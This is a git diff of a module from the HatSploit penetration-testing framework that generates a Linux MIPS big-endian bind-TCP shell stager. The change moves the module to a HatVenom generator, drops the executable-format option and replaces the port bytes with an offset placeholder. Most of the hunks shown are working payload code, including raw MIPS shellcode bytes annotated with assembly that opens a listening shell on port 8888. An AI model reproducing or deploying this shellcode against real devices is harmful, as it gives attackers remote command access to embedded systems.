@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux mipsbe Shell Bind TCP",
@@ -55,22 +55,15 @@ class HatSploitPayload(Payload, PayloadGenerator):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        bind_port, executable_format = self.parse_options(self.options)
-        bind_port = self.port_to_bytes(bind_port)
+        bind_port = self.parse_options(self.options)
 
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'bport': bind_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -90,7 +83,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
             b"\x24\x0d\xff\xfd"  # li      t5,-3                         ; t5: -3
             b"\x01\xa0\x68\x27"  # nor     t5,t5,zero                    ; t5: 0x2
             b"\x01\xcd\x68\x04"  # sllv    t5,t5,t6                      ; t5: 0x00020000
-            b"\x24\x0e" + bind_port +  # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default LPORT))
+            b"\x24\x0e:bport:port:"  # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default BPORT))
             b"\x01\xae\x68\x25"  # or      t5,t5,t6                      ; t5: 0x0002115c
             b"\xaf\xad\xff\xe0"  # sw      t5,-32(sp)
             b"\xaf\xa0\xff\xe4"  # sw      zero,-28(sp)
@@ -148,6 +141,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'mipsbe', shellcode)
+        payload = self.generate('elf', 'mipsbe', shellcode, offsets)
 
         return payload
